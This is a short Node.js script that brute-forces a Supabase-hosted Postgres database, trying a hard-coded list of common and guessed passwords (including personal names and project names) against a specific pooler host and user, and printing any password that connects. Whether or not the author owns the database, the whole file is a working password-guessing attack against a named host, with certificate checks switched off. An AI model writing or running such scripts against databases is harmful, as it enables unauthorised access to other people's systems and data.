delete process.env.PGUSER;
delete process.env.PGPASSWORD;
delete process.env.PGHOST;
delete process.env.PGPORT;
delete process.env.PGDATABASE;

const { Client } = require('pg');
require('dotenv').config({ path: '.env.local' });

const passwords = [
  '123456',
  'Password123',
  'Password123!',
  'postgres',
  'postgres123',
  'findora',
  'findora123',
  'findora_password',
  'mostafa',
  'nada',
  'mostafa123',
  'nada123',
  'tradeora',
  'foundora',
  'admin',
  'admin123',
  'root',
  'root123',
  process.env.SUPABASE_SECRET_KEY
].filter(Boolean);

async function testPassword(pwd) {
  const client = new Client({
    user: 'postgres.knsjvttjkbdztxmtjxpz',
    password: pwd,
    host: 'aws-1-eu-west-1.pooler.supabase.com',
    port: 6543,
    database: 'postgres',
    ssl: { rejectUnauthorized: false }
  });

  try {
    await client.connect();
    console.log(`\n🎉🎉 SUCCESS! Correct password is: ${pwd}`);
    await client.end();
    return true;
  } catch (err) {
    process.stdout.write('.');
    await client.end().catch(() => {});
    return false;
  }
}

async function main() {
  console.log(`Starting brute force on port 6543 for user postgres.knsjvttjkbdztxmtjxpz...`);
  for (const pwd of passwords) {
    const ok = await testPassword(pwd);
    if (ok) return;
  }
  console.log('\nBrute force finished. No password matched.');
}

main().catch(console.error);
